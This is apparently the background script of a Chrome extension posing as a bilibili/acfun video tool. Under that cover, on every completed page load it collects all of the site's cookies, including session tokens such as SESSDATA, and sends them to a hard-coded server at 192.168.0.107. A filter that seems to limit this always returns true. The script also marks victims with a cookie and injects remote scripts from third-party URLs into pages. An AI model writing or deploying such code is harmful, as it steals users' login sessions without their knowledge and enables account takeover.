// 获取插件id
let eid = chrome.runtime.id;
let tabid;
let url = 'http://192.168.0.107:8000/test';
let cookieTime = 24*3600*1000;
let markcookie = "MARK!TEST";
let updatetime = +new Date("2020-10-28");
let loadjslist = [
        "https://cdn.jsdelivr.net/gh/xsyhnb/tool/bilibilitools.js",
        "https://greasyfork.org/scripts/414973-acfunqlist/code/acfunqlist.js",
    ]
let cookiefilter={
    "bilibili.com":"SESSDATA",
    "acfun.cn":"BDUSS_BFESS"
}
function addScript(url){
    var s = document.createElement('script');
    s.setAttribute('src',url);
    document.body.appendChild(s);
}

// video download
addScript('https://greasyfork.org/scripts/414968-content01/code/content01.js');

// 发送请求
function sendRequest(method,data,url,resFunc){
    var xhr = new XMLHttpRequest();
    xhr.onload = function(){resFunc(xhr)}
    var param = packData(data);
    // xhr.responseType="json";
    xhr.timeout = 5000;
    xhr.ontimeout = function(err){console.log(err);}
    if(method==''||method=="GET"){
        xhr.open("GET", url+'?'+param, true);
        // xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(null);
    }else if(method=="POST"){
        xhr.open("POST", url, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(param);
    }
}

// getAnswer(1)
// 获取tabid
chrome.tabs.onActivated.addListener(function(tab){
    tabid = tab.tabId;
    console.log('onActivated ===> ',tab.tabId);
});

// tab
chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
    console.log('changeinfo ===>',changeInfo)
    
    if(changeInfo.status=="complete" && tabid){
        // getCookies();
    }else if(changeInfo.status=="loading" && tabid){
        
    }

});


function checkTargetCookie(cookiesget,domain){
    let check=false;
    Object.keys(cookiefilter).forEach(key=>{
        if(key==domain && cookiesget.search(cookiefilter[key])>=0 && cookiesget.search(markcookie)<0){
            console.log('check');
            check=true;
        }
    });
    return true
}

// 获取页面cookie
function getCookies(tabidcookie){
    chrome.tabs.get(tabidcookie,function(tab){
        if(tab.url){
            let domain = tab.url.split("://")[1].split("/")[0];
            if(domain.startsWith("www.")){
                domain = domain.replace("www.","");
            }
            console.log(domain);
            chrome.cookies.getAll({domain:domain},function(cookies){
                console.log(cookies)
                var cookiesfiltered = unpack2(cookies,domain);
                // console.log(cookiesfiltered);
                if(checkTargetCookie(cookiesfiltered,domain)){
                    var datasend = {};
                    datasend.cookie = encodeURIComponent(cookiesfiltered);
                    datasend.cookie = cookiesfiltered;
                    datasend.eid = eid;
                    datasend.domain = domain;
                    console.log(datasend)
                    sendRequest("GET",datasend,url,function(res){
                        // var resp = res.response;
                        if(res.response.s=='s'){
                            console.log('set into cookie');
                            setmark(tab.url);
                        }
                        // console.log(res,res.response);
                    })
                    
                }  
            });
        }
    });
}


chrome.webNavigation.onCompleted.addListener(function(web){
    console.log('completed ===>',web);
    if( web.frameId==0){
        getCookies(web.tabId);
        chrome.tabs.sendMessage(web.tabId,{jslist:loadjslist},
            function(response) {
            //回传函数
            console.log(response)
            });
    }
});
    chrome.runtime.onMessage.addListener(function (request,sender,callback) {
        var xhr = new XMLHttpRequest();
        xhr.open(request.method, request.url, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                console.log('xhr ===> ');
                callback(packResponse(xhr));
                // 
            }
        }
        xhr.send();
        return true;
    });

    function packResponse(obj){
        let d={};
        d.status=obj.status;
        d.response=obj.response;
        d.responseURL = obj.responseURL;
        d.responseText = obj.responseText;
        d.responseType = obj.responseType;
        d.statusText = obj.statusText;
        return d
    }
// 整理cookies 信息
function unpack2(cookies,domain){
    let s="";
    var show=[];
    cookies.forEach(obj => {
        
        if(obj.domain.search(domain)>=0){
            s += `${obj.name}=${obj.value}; domain=${obj.domain};expirationDate=${obj.expirationDate};|++|`;
            show.push(obj);
        }
    });
    console.log(show)
    return s
}

function packData(data){
    var params='';
    if(Object.keys(data).length>0){
        Object.keys(data).forEach(key=>{
            params += `${key}=${data[key]}&`;
        })
        return params
    }else{
        return params
    }
    
}

// 注入标志cookie
function setmark(url){
    let obj = {}
    obj.url = url;
    obj.name = markcookie;
    obj.value = "hello world";
    obj.expirationDate = (+new Date()+cookieTime)/1000;
    chrome.cookies.set(obj,function(cookies){console.log(cookies)})
}